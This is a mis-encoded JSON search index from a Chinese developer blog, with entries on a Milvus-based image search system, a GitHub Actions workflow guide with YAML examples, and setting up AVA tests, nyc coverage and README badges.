","date":"2020-03-31","objectID":"/image-search-system/:1:3","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","uri":"/image-search-system/"},{"categories":["Engineering"],"content":"æœç´¢å¼•æ“ ç”±äºå°†å›¾åƒè½¬æ¢ä¸ºäº†ç‰¹å¾å‘é‡ï¼Œå› æ­¤æœç´¢å¼•æ“æ‰€è¦åšçš„å°±æ˜¯å…¶å®å°±æ˜¯å‘é‡æ£€ç´¢ã€‚ è¿™é‡Œç›´æ¥æ¨è Milvus ï¼Œåˆšå¼€æºä¸ä¹…ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿å¿«æ·çš„ä½¿ç”¨åœ¨å·¥ç¨‹é¡¹ç›®ä¸Šï¼Œå…·ä½“çš„ç›¸å…³å†…å®¹ç›´æ¥æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å³å¯ã€‚ ","date":"2020-03-31","objectID":"/image-search-system/:2:0","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","uri":"/image-search-system/"},{"categories":["Uncate"],"content":"GitHub Actions æŒ‡å—","date":"2019-12-23","objectID":"/github-actions/","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"GitHub Actions æŒ‡å— GitHub Actions ä½¿ä½ å¯ä»¥ç›´æ¥åœ¨ä½ çš„ GitHub åº“ä¸­åˆ›å»ºè‡ªå®šä¹‰çš„å·¥ä½œæµï¼Œå·¥ä½œæµæŒ‡çš„å°±æ˜¯è‡ªåŠ¨åŒ–çš„æµç¨‹ï¼Œæ¯”å¦‚æ„å»ºã€æµ‹è¯•ã€æ‰“åŒ…ã€å‘å¸ƒã€éƒ¨ç½²ç­‰ç­‰ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¯ä»¥ç›´æ¥è¿›è¡Œ CIï¼ˆæŒç»­é›†æˆï¼‰å’Œ CD ï¼ˆæŒç»­éƒ¨ç½²ï¼‰ã€‚ ","date":"2019-12-23","objectID":"/github-actions/:0:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"åŸºæœ¬æ¦‚å¿µ workflow : ä¸€ä¸ª workflow å·¥ä½œæµå°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¿‡ç¨‹ï¼Œæ¯ä¸ª workflow åŒ…å«ä¸€ç»„ jobs ä»»åŠ¡ã€‚ job : jobs ä»»åŠ¡åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª job ï¼Œæ¯ä¸ª job åŒ…å«ä¸€ç³»åˆ—çš„ steps æ­¥éª¤ã€‚ step : æ¯ä¸ª step æ­¥éª¤å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤æˆ–è€…ä½¿ç”¨ä¸€ä¸ª action åŠ¨ä½œã€‚ action : æ¯ä¸ª action åŠ¨ä½œå°±æ˜¯ä¸€ä¸ªé€šç”¨çš„åŸºæœ¬å•å…ƒã€‚ ","date":"2019-12-23","objectID":"/github-actions/:1:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"é…ç½® workflow workflow å¿…é¡»å­˜å‚¨åœ¨ä½ çš„é¡¹ç›®åº“æ ¹è·¯å¾„ä¸‹çš„ .github/workflows ç›®å½•ä¸­ï¼Œæ¯ä¸€ä¸ª workflow å¯¹åº”ä¸€ä¸ªå…·ä½“çš„ .yml æ–‡ä»¶ï¼ˆæˆ–è€… .yamlï¼‰ã€‚ workflow ç¤ºä¾‹ï¼š name: Greet Everyone # This workflow is triggered on pushes to the repository. on: [push] jobs: your_job_id: # Job name is Greeting name: Greeting # This job runs on Linux runs-on: ubuntu-latest steps: # This step uses GitHub's hello-world-javascript-action: https://github.com/actions/hello-world-javascript-action - name: Hello world uses: actions/hello-world-javascript-action@v1 with: who-to-greet: 'Mona the Octocat' id: hello # This step prints an output (time) from the previous step's action. - name: Echo the greeting's time run: echo 'The time was ${{ steps.hello.outputs.time }}.' è¯´æ˜ï¼š æœ€å¤–å±‚çš„ name æŒ‡å®šäº† workflow çš„åç§°ã€‚ on å£°æ˜äº†ä¸€æ—¦å‘ç”Ÿäº† push æ“ä½œå°±ä¼šè§¦å‘è¿™ä¸ª workflow ã€‚ jobs å®šä¹‰äº†ä»»åŠ¡é›†ï¼Œå…¶ä¸­å¯ä»¥æœ‰ä¸€ä¸ªæˆ–å¤šä¸ª job ä»»åŠ¡ï¼Œç¤ºä¾‹ä¸­åªæœ‰ä¸€ä¸ªã€‚ runs-on å£°æ˜äº†è¿è¡Œçš„ç¯å¢ƒã€‚ steps å®šä¹‰éœ€è¦æ‰§è¡Œå“ªäº›æ­¥éª¤ã€‚ æ¯ä¸ª step å¯ä»¥å®šä¹‰è‡ªå·±çš„ name å’Œ id ï¼Œé€šè¿‡ uses å¯ä»¥å£°æ˜ä½¿ç”¨ä¸€ä¸ªå…·ä½“çš„ action ï¼Œé€šè¿‡ run å£°æ˜éœ€è¦æ‰§è¡Œå“ªäº›æŒ‡ä»¤ã€‚ ${{ }} å¯ä»¥ä½¿ç”¨ä¸Šä¸‹æ–‡å‚æ•°ã€‚ ä¸Šè¿°ç¤ºä¾‹å¯ä»¥æŠ½è±¡ä¸ºï¼š name: \u003cworkflow name\u003e on: \u003cevents that trigger workflows\u003e jobs: \u003cjob_id\u003e: name: \u003cjob_name\u003e runs-on: \u003crunner\u003e steps: - name: \u003cstep_name\u003e uses: \u003caction\u003e with: \u003cparameter_name\u003e: \u003cparameter_value\u003e id: \u003cstep_id\u003e - name: \u003cstep_name\u003e run: \u003ccommands\u003e ","date":"2019-12-23","objectID":"/github-actions/:2:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"on on å£°æ˜äº†ä½•æ—¶è§¦å‘ workflow ï¼Œå®ƒå¯ä»¥æ˜¯ï¼š ä¸€ä¸ªæˆ–å¤šä¸ª GitHub äº‹ä»¶ï¼Œæ¯”å¦‚ push äº†ä¸€ä¸ª commitã€åˆ›å»ºäº†ä¸€ä¸ª issueã€äº§ç”Ÿäº†ä¸€æ¬¡ pull request ç­‰ç­‰ï¼Œç¤ºä¾‹ï¼š on: [push, pull_request] é¢„å®šçš„æ—¶é—´ï¼Œç¤ºä¾‹ï¼ˆæ¯å¤©é›¶ç‚¹é›¶åˆ†è§¦å‘ï¼‰ï¼š on: schedule: - cron: '0 0 * * *' æŸä¸ªå¤–éƒ¨äº‹ä»¶ã€‚æ‰€è°“å¤–éƒ¨äº‹ä»¶è§¦å‘ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯ä½ å¯ä»¥é€šè¿‡ REST API å‘ GitHub å‘é€è¯·æ±‚å»è§¦å‘ï¼Œå…·ä½“è¯·æŸ¥é˜…å®˜æ–¹æ–‡æ¡£: repository-dispatch-event é…ç½®å¤šä¸ªäº‹ä»¶ï¼Œç¤ºä¾‹ï¼š on: # Trigger the workflow on push or pull request, # but only for the master branch push: branches: - master pull_request: branches: - master # Also trigger on page_build, as well as release created events page_build: release: types: # This configuration does not affect the page_build event above - created è¯¦ç»†æ–‡æ¡£è¯·å‚è€ƒ: è§¦å‘äº‹ä»¶ ","date":"2019-12-23","objectID":"/github-actions/:3:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"jobs jobs å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª job ï¼Œå¦‚: jobs: my_first_job: name: My first job my_second_job: name: My second job å¦‚æœå¤šä¸ª job ä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œé‚£ä¹ˆä½ å¯èƒ½éœ€è¦ä½¿ç”¨ needs : jobs: job1: job2: needs: job1 job3: needs: [job1, job2] è¿™é‡Œçš„ needs å£°æ˜äº† job2 å¿…é¡»ç­‰å¾… job1 æˆåŠŸå®Œæˆï¼Œjob3 å¿…é¡»ç­‰å¾… job1 å’Œ job2 ä¾æ¬¡æˆåŠŸå®Œæˆã€‚ æ¯ä¸ªä»»åŠ¡é»˜è®¤è¶…æ—¶æ—¶é—´æœ€é•¿ä¸º 360 åˆ†é’Ÿï¼Œä½ å¯ä»¥é€šè¿‡ timeout-minutes è¿›è¡Œé…ç½®: jobs: job1: timeout-minutes: ","date":"2019-12-23","objectID":"/github-actions/:4:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"runs-on \u0026 strategy runs-on æŒ‡å®šäº†ä»»åŠ¡çš„ runner å³æ‰§è¡Œç¯å¢ƒï¼Œrunner åˆ†ä¸¤ç§ï¼šGitHub-hosted runner å’Œ self-hosted runner ã€‚ æ‰€è°“çš„ self-hosted runner å°±æ˜¯ç”¨ä½ è‡ªå·±çš„æœºå™¨ï¼Œä½†æ˜¯éœ€è¦ GitHub èƒ½è¿›è¡Œè®¿é—®å¹¶ç»™ä¸å…¶æ‰€éœ€çš„æœºå™¨æƒé™ï¼Œè¿™ä¸ªä¸åœ¨æœ¬æ–‡æè¿°èŒƒå›´å†…ï¼Œæœ‰å…´è¶£å¯å‚è€ƒ self-hosted runner ã€‚ GitHub-hosted runner å…¶å®å°±æ˜¯ GitHub æä¾›çš„è™šæ‹Ÿç¯å¢ƒï¼Œç›®å‰æœ‰ä»¥ä¸‹å››ç§: windows-latest : Windows Server 2019 ubuntu-latest æˆ– ubuntu-18.04 : Ubuntu 18.04 ubuntu-16.04 : Ubuntu 16.04 macos-latest : macOS Catalina 10.15 æ¯”è¾ƒå¸¸è§çš„: runs-on: ubuntu-latest ","date":"2019-12-23","objectID":"/github-actions/:5:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"runs-on å¤šç¯å¢ƒ æœ‰æ—¶å€™æˆ‘ä»¬å¸¸å¸¸éœ€è¦å¯¹å¤šä¸ªæ“ä½œç³»ç»Ÿã€å¤šä¸ªå¹³å°ã€å¤šä¸ªç¼–ç¨‹è¯­è¨€ç‰ˆæœ¬è¿›è¡Œæµ‹è¯•ï¼Œä¸ºæ­¤æˆ‘ä»¬å¯ä»¥é…ç½®ä¸€ä¸ªæ„å»ºçŸ©é˜µã€‚ ä¾‹å¦‚ï¼š runs-on: ${{ matrix.os }} strategy: matrix: os: [ubuntu-16.04, ubuntu-18.04] node: [6, 8, 10] ç¤ºä¾‹ä¸­é…ç½®äº†ä¸¤ç§ os æ“ä½œç³»ç»Ÿå’Œä¸‰ç§ node ç‰ˆæœ¬å³æ€»å…±å…­ç§æƒ…å†µçš„æ„å»ºçŸ©é˜µï¼Œ${{ matrix.os }} æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡å‚æ•°ã€‚ strategy ç­–ç•¥ï¼ŒåŒ…æ‹¬ï¼š matrix : æ„å»ºçŸ©é˜µã€‚ fail-fast : é»˜è®¤ä¸º true ï¼Œå³ä¸€æ—¦æŸä¸ªçŸ©é˜µä»»åŠ¡å¤±è´¥åˆ™ç«‹å³å–æ¶ˆæ‰€æœ‰è¿˜åœ¨è¿›è¡Œä¸­çš„ä»»åŠ¡ã€‚ max-paraller : å¯åŒæ—¶æ‰§è¡Œçš„æœ€å¤§å¹¶å‘æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ GitHub ä¼šåŠ¨æ€è°ƒæ•´ã€‚ ç¤ºä¾‹ï¼š runs-on: ${{ matrix.os }} strategy: matrix: os: [macos-latest, windows-latest, ubuntu-18.04] node: [4, 6, 8, 10] include: # includes a new variable of npm with a value of 2 for the matrix leg matching the os and version - os: windows-latest node: 4 npm: 2 include å£°æ˜äº† os ä¸º windows-latest æ—¶ï¼Œå¢åŠ ä¸€ä¸ª node å’Œ npm åˆ†åˆ«ä½¿ç”¨ç‰¹å®šçš„ç‰ˆæœ¬çš„çŸ©é˜µç¯å¢ƒã€‚ ä¸ include ç›¸åçš„å°±æ˜¯ exclude ï¼š runs-on: ${{ matrix.os }} strategy: matrix: os: [macos-latest, windows-latest, ubuntu-18.04] node: [4, 6, 8, 10] exclude: # excludes node 4 on macOS - os: macos-latest node: 4 exclude ç”¨æ¥åˆ é™¤ç‰¹å®šçš„é…ç½®é¡¹ï¼Œæ¯”å¦‚è¿™é‡Œå½“ os ä¸º macos-latest ï¼Œå°† node ä¸º 4 çš„ç‰ˆæœ¬ä»æ„å»ºçŸ©é˜µä¸­ç§»é™¤ã€‚ ","date":"2019-12-23","objectID":"/github-actions/:5:1","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"steps steps çš„é€šç”¨æ ¼å¼ç±»ä¼¼äºï¼š steps: - name: \u003cstep_name\u003e uses: \u003caction\u003e with: \u003cparameter_name\u003e: \u003cparameter_value\u003e id: \u003cstep_id\u003e continue-on-error: true - name: \u003cstep_name\u003e timeout-minutes: run: \u003ccommands\u003e æ¯ä¸ª step æ­¥éª¤å¯ä»¥æœ‰: id : æ¯ä¸ªæ­¥éª¤çš„å”¯ä¸€æ ‡è¯†ç¬¦ name : æ­¥éª¤çš„åç§° uses : ä½¿ç”¨å“ªä¸ª action run : æ‰§è¡Œå“ªäº›æŒ‡ä»¤ with : æŒ‡å®šæŸä¸ª action å¯èƒ½éœ€è¦è¾“å…¥çš„å‚æ•° continue-on-error : è®¾ç½®ä¸º true å…è®¸æ­¤æ­¥éª¤å¤±è´¥ job ä»ç„¶é€šè¿‡ timeout-minutes : step çš„è¶…æ—¶æ—¶é—´ ","date":"2019-12-23","objectID":"/github-actions/:6:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"action action åŠ¨ä½œé€šå¸¸æ˜¯å¯ä»¥é€šç”¨çš„ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨åˆ«äººå®šä¹‰å¥½çš„ action ã€‚ ","date":"2019-12-23","objectID":"/github-actions/:7:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"checkout action checkout action æ˜¯ä¸€ä¸ªæ ‡å‡†åŠ¨ä½œï¼Œå½“ä»¥ä¸‹æƒ…å†µæ—¶å¿…é¡»ä¸”éœ€è¦ç‡å…ˆä½¿ç”¨: workflow éœ€è¦é¡¹ç›®åº“çš„ä»£ç å‰¯æœ¬ï¼Œæ¯”å¦‚æ„å»ºã€æµ‹è¯•ã€æˆ–æŒç»­é›†æˆè¿™äº›æ“ä½œã€‚ workflow ä¸­è‡³å°‘æœ‰ä¸€ä¸ª action æ˜¯åœ¨åŒä¸€ä¸ªé¡¹ç›®åº“ä¸‹å®šä¹‰çš„ã€‚ ä½¿ç”¨ç¤ºä¾‹ï¼š - uses: actions/checkout@v1 å¦‚æœä½ åªæƒ³æµ…å…‹éš†ä½ çš„åº“ï¼Œæˆ–è€…åªå¤åˆ¶æœ€æ–°çš„ç‰ˆæœ¬ï¼Œä½ å¯ä»¥åœ¨ with ä¸­ä½¿ç”¨ fetch-depth å£°æ˜ï¼Œä¾‹å¦‚: - uses: actions/checkout@v1 with: fetch-depth: 1 ","date":"2019-12-23","objectID":"/github-actions/:7:1","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"å¼•ç”¨ action å®˜æ–¹ action æ ‡å‡†åº“: github.com/actions ç¤¾åŒºåº“: marketplace 1ã€å¼•ç”¨å…¬æœ‰åº“ä¸­çš„ action å¼•ç”¨ action çš„æ ¼å¼æ˜¯ {owner}/{repo}@{ref} æˆ– {owner}/{repo}/{path}@{ref} ï¼Œä¾‹å¦‚ä¸Šä¾‹çš„ä¸­ actions/checkout@v1 ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨æ ‡å‡†åº“ä¸­çš„å…¶å®ƒ action ï¼Œå¦‚è®¾ç½® node ç‰ˆæœ¬: jobs: my_first_job: name: My Job Name steps: - uses: actions/setup-node@v1 with: node-version: 10.x 2ã€å¼•ç”¨åŒä¸€ä¸ªåº“ä¸­çš„ action å¼•ç”¨æ ¼å¼ï¼š{owner}/{repo}@{ref} æˆ– ./path/to/dir ã€‚ ä¾‹å¦‚é¡¹ç›®æ–‡ä»¶ç»“æ„ä¸ºï¼š |-- hello-world (repository) | |__ .github | â””â”€â”€ workflows | â””â”€â”€ my-first-workflow.yml | â””â”€â”€ actions | |__ hello-world-action | â””â”€â”€ action.yml å½“ä½ æƒ³è¦åœ¨ workflow ä¸­å¼•ç”¨è‡ªå·±çš„ action æ—¶å¯ä»¥ï¼š jobs: build: runs-on: ubuntu-latest steps: # This step checks out a copy of your repository. - uses: actions/checkout@v1 # This step references the directory that contains the action. - uses: ./.github/actions/hello-world-action 3ã€å¼•ç”¨ Docker Hub ä¸Šçš„ container å¦‚æœæŸä¸ª action å®šä¹‰åœ¨äº†ä¸€ä¸ª docker container image ä¸­ä¸”æ¨é€åˆ°äº† Docker Hub ä¸Šï¼Œä½ ä¹Ÿå¯ä»¥å¼•å…¥å®ƒï¼Œæ ¼å¼æ˜¯ docker://{image}:{tag} ï¼Œç¤ºä¾‹ï¼š jobs: my_first_job: steps: - name: My first step uses: docker://alpine:3.8 æ›´å¤šä¿¡æ¯å‚è€ƒ: Docker-image.yml workflow å’Œ Creating a Docker container action ã€‚ ","date":"2019-12-23","objectID":"/github-actions/:7:2","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"æ„å»º actions è¯·å‚è€ƒï¼šbuilding-actions ","date":"2019-12-23","objectID":"/github-actions/:7:3","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"env ç¯å¢ƒå˜é‡å¯ä»¥é…ç½®åœ¨ä»¥ä¸‹åœ°æ–¹: env jobs.\u003cjob_id\u003e.env jobs.\u003cjob_id\u003e.steps.env ç¤ºä¾‹ï¼š env: NODE_ENV: dev jobs: job1: env: NODE_ENV: test steps: - name: env: NODE_ENV: prod å¦‚æœé‡å¤ï¼Œä¼˜å…ˆä½¿ç”¨æœ€è¿‘çš„é‚£ä¸ªã€‚ ","date":"2019-12-23","objectID":"/github-actions/:8:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"if \u0026 context ä½ å¯ä»¥åœ¨ job å’Œ step ä¸­ä½¿ç”¨ if æ¡ä»¶è¯­å¥ï¼Œåªæœ‰æ»¡è¶³æ¡ä»¶æ—¶æ‰æ‰§è¡Œå…·ä½“çš„ job æˆ– step : jobs.\u003cjob_id\u003e.if jobs.\u003cjob_id\u003e.steps.if ä»»åŠ¡çŠ¶æ€æ£€æŸ¥å‡½æ•°: success() : å½“ä¸Šä¸€æ­¥æ‰§è¡ŒæˆåŠŸæ—¶è¿”å› true always() : æ€»æ˜¯è¿”å› true cancelled() : å½“ workflow è¢«å–æ¶ˆæ—¶è¿”å› true failure() : å½“ä¸Šä¸€æ­¥æ‰§è¡Œå¤±è´¥æ—¶è¿”å› true ä¾‹å¦‚ï¼š steps: - name: step1 if: always() - name: step2 if: success() - name: step3 if: failure() æ„æ€å°±æ˜¯ step1 æ€»æ˜¯æ‰§è¡Œï¼Œstep2 éœ€è¦ä¸Šä¸€æ­¥æ‰§è¡ŒæˆåŠŸæ‰æ‰§è¡Œï¼Œstep3 åªæœ‰å½“ä¸Šä¸€æ­¥æ‰§è¡Œå¤±è´¥æ‰æ‰§è¡Œã€‚ ","date":"2019-12-23","objectID":"/github-actions/:9:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"${{ \u003cexpression\u003e }} ä¸Šä¸‹æ–‡å’Œè¡¨è¾¾å¼: ${{ \u003cexpression\u003e }} ã€‚ æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸ç¬¬ä¸‰æ–¹å¹³å°è¿›è¡Œäº¤äº’ï¼Œè¿™æ—¶å€™é€šå¸¸éœ€è¦é…ç½®ä¸€ä¸ª token ï¼Œä½†æ˜¯æ˜¾ç„¶è¿™ä¸ª token ä¸å¯èƒ½æ˜æ–‡ä½¿ç”¨ï¼Œè¿™ç§ä¸ªæƒ…å†µä¸‹æˆ‘ä»¬è¦åšçš„å°±æ˜¯ï¼š åœ¨å…·ä½“ repository åº“ Settings çš„ Secrets ä¸­æ·»åŠ ä¸€ä¸ªå¯†é’¥ï¼Œå¦‚ SOMEONE_TOKEN ç„¶ååœ¨ workflow ä¸­å°±å¯ä»¥é€šè¿‡ ${{ secrets.SOMEONE_TOKEN }} å°† token å®‰å…¨åœ°ä¼ é€’ç»™ç¯å¢ƒå˜é‡ã€‚ steps: - name: My first action env: SOMEONE_TOKEN: ${{ secrets.SOMEONE_TOKEN }} è¿™é‡Œçš„ secrets å°±æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ï¼š github.event_name : è§¦å‘ workflow çš„äº‹ä»¶åç§° job.status : å½“å‰ job çš„çŠ¶æ€ï¼Œå¦‚ success, failure, or cancelled steps.\u003cstep id\u003e.outputs : æŸä¸ª action çš„è¾“å‡º runner.os : runner çš„æ“ä½œç³»ç»Ÿå¦‚ Linux, Windows, or macOS è¿™é‡Œåªåˆ—ä¸¾äº†å°‘æ•°å‡ ä¸ªã€‚ å¦å¤–åœ¨ if ä¸­ä½¿ç”¨æ—¶ä¸éœ€è¦ ${{ }} ç¬¦å·ï¼Œæ¯”å¦‚ï¼š steps: - name: My first step if: github.event_name == 'pull_request' \u0026\u0026 github.event.action == 'unassigned' run: echo This event is a pull request that had an assignee removed. ä¸Šä¸‹æ–‡å’Œè¡¨è¾¾å¼è¯¦ç»†ä¿¡æ¯è¯·å‚è€ƒï¼š contexts-and-expression ","date":"2019-12-23","objectID":"/github-actions/:9:1","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"ç»“è¯­ æœ€åç»™ä¸ªè‡ªå·±å†™çš„ç¤ºä¾‹ï¼Œä»…ä¾›å‚è€ƒï¼š name: GitHub Actions CI on: [push] jobs: build-test-deploy: runs-on: ubuntu-latest strategy: matrix: node-version: [8.x, 10.x, 12.x] steps: - uses: actions/checkout@v1 - name: install linux packages run: sudo apt-get install -y --no-install-recommends libevent-dev - name: install memcached if: success() run: | wget -O memcached.tar.gz http://memcached.org/files/memcached-1.5.20.tar.gz tar -zxvf memcached.tar.gz cd memcached-1.5.20 ./configure \u0026\u0026 make \u0026\u0026 sudo make install memcached -d - name: Use Node.js ${{ matrix.node-version }} uses: actions/setup-node@v1 if: success() with: node-version: ${{ matrix.node-version }} - name: npm install, build, and test env: CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }} if: success() run: | npm ci npm test npm run report-coverage ","date":"2019-12-23","objectID":"/github-actions/:10:0","tags":["Github","CICD"],"title":"GitHub Actions æŒ‡å—","uri":"/github-actions/"},{"categories":["Uncate"],"content":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","date":"2019-12-21","objectID":"/ava-codecov-travis/","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"ç»™åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç«  \u0026 avaã€codecovã€travis ç¤ºä¾‹ GitHub å¾ˆå¤šå¼€æºåº“éƒ½ä¼šæœ‰å‡ ä¸ªé…·ç‚«çš„å°å¾½ç« ï¼Œæ¯”å¦‚ï¼š è¿™äº›æ˜¯æ€ä¹ˆåŠ ä¸Šå»çš„å‘¢ï¼Ÿ ","date":"2019-12-21","objectID":"/ava-codecov-travis/:0:0","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"Shields.io é¦–å…ˆè¿™äº›å¾½ç« å¯ä»¥ç›´æ¥å» shields.io ç½‘ç«™è‡ªåŠ¨ç”Ÿæˆã€‚ æ¯”å¦‚ï¼š å°±æ˜¯ version è¿™ä¸€ç±»é‡Œçš„ä¸€ç§å›¾æ ‡ï¼Œé€‰æ‹© npm ä¸€æ å¡«å…¥åŒ…åï¼Œç„¶åå¤åˆ¶æˆ Markdown å†…å®¹ï¼Œå°±ä¼šå¾—åˆ°è¯¸å¦‚ï¼š ![npm (tag)](https://img.shields.io/npm/v/io-memcached/latest) ç›´æ¥ç²˜è´´åœ¨ .md æ–‡ä»¶ä¸­å°±å¯ä»¥ä½¿ç”¨äº†ï¼Œæœ€åå±•ç°çš„å°±æ˜¯è¿™ä¸ªå›¾æ ‡ã€‚ å½“ç„¶è¿˜æœ‰å…¶ä»–å¾ˆå¤šå¾½ç« éƒ½ä»»ç”±ä½ æŒ‘é€‰ï¼Œä¸è¿‡æŸäº›å¾½ç« æ˜¯éœ€è¦é¢å¤–è¿›è¡Œä¸€äº›é…ç½®ï¼Œæ¯”å¦‚è¿™é‡Œçš„ (è‡ªåŠ¨æ„å»ºé€šè¿‡) å’Œ (æµ‹è¯•è¦†ç›–ç‡)ã€‚ ","date":"2019-12-21","objectID":"/ava-codecov-travis/:1:0","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"AVA è°ˆåˆ°æµ‹è¯•è¦†ç›–ç‡å¿…é¡»å…ˆæœ‰å•å…ƒæµ‹è¯•ï¼Œæœ¬æ–‡ä½¿ç”¨ ava ä½œä¸ºç¤ºä¾‹ï¼Œava æ˜¯ä¸€ä¸ª js æµ‹è¯•åº“ï¼Œå¼ºçƒˆæ¨èä½ ä½¿ç”¨å®ƒã€‚ 1ã€å®‰è£… npm init ava 2ã€ä½¿ç”¨ç¤ºä¾‹ ç¼–å†™ test.js æ–‡ä»¶ï¼š import test from 'ava' import Memcached from '../lib/memcached'; test.before(t =\u003e { const memcached = new Memcached(['127.0.0.1:11211'], { pool: { max: 2, min: 0 }, timeout: 5000 }); t.context.memcached = memcached; }); test('memcached get/set', async t =\u003e { try { t.plan(3); const key = 'testkey'; const testdata = 'testest\\r\\n\\stese'; const r = await t.context.memcached.set(key, testdata); t.is(r, 'STORED'); const g = await t.context.memcached.get(key, testdata); t.is(g, testdata); const dr = await t.context.memcached.del(key); t.is(dr, 'DELETED'); } catch (error) { t.fail(error.message); } }); test('unit test title', t =\u003e { t.pass(); }); è¯´æ˜ï¼š ava æœ¬èº«å°±æ”¯æŒå¾ˆå¤š es6 åŠä»¥ä¸Šçš„ç‰¹æ€§ï¼Œä½ ä¸ç”¨å¦å¤–å†ä½¿ç”¨ babel ã€‚ test.before å°±æ˜¯ä¸€ä¸ªé’©å­ï¼Œä½ å¯ä»¥é€šè¿‡ context å‘åä¼ é€’å˜é‡å¹¶ä½¿ç”¨ã€‚ test('title', t =\u003e {}) å‡½æ•°æ„é€ æˆ‘ä»¬çš„å•å…ƒæµ‹è¯•ï¼Œæ¯é¡¹æµ‹è¯•çš„åç§°å¯ä»¥è‡ªå·±å®šä¹‰ï¼Œä½¿ç”¨éå¸¸æ–¹ä¾¿ï¼Œå¤šä¸ª test ä¹‹é—´æ˜¯å¹¶å‘æ‰§è¡Œçš„ï¼Œå¦‚æœä½ éœ€è¦ä¾æ¬¡æ‰§è¡Œåˆ™ä½¿ç”¨ test.serial()ã€‚ t.plan() å£°æ˜äº†æ¯é¡¹æµ‹è¯•ä¸­åº”è¯¥æœ‰å‡ æ¬¡æ–­è¨€ã€‚ t.is() åˆ™æ˜¯è¿›è¡Œæ–­è¨€åˆ¤æ–­ã€‚ t.fail() å£°æ˜å•é¡¹æµ‹è¯•ä¸é€šè¿‡ã€‚ t.pass() å£°æ˜å•é¡¹æµ‹è¯•é€šè¿‡ã€‚ å½“ç„¶è¿™é‡Œåªæ˜¯å±•ç¤ºäº†å¾ˆå°‘çš„å‡ ä¸ªç”¨æ³•ï¼Œæ›´å¤šè¯¦ç»†çš„å†…å®¹çœ‹å®˜æ–¹æ–‡æ¡£ã€‚ ","date":"2019-12-21","objectID":"/ava-codecov-travis/:2:0","tags":["Github","Node.js"],"title":"ç»™ä½ çš„åº“åŠ ä¸Šé…·ç‚«çš„å°å¾½ç« ","uri":"/ava-codecov-travis/"},{"categories":["Uncate"],"content":"coverage å•å…ƒæµ‹è¯•æœ‰äº†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰æµ‹è¯•è¦†ç›–ç‡ï¼Œä¸ºæ­¤æˆ‘ä»¬è¿˜éœ€è¦ nyc ã€‚ npm install --save-dev nyc ä¿®æ”¹ package.json æ–‡ä»¶: { \"scripts\": { \"test\": \"nyc ava\" } } è·å–æµ‹è¯•è¦†ç›–ç‡æ—¶ä¼šç”Ÿæˆç›¸å…³çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨ .gitignore ä¸­å¿½ç•¥å®ƒä»¬å³å¯: .nyc_output coverage* å½“æˆ‘ä»¬å†æ‰§è¡Œ npm test 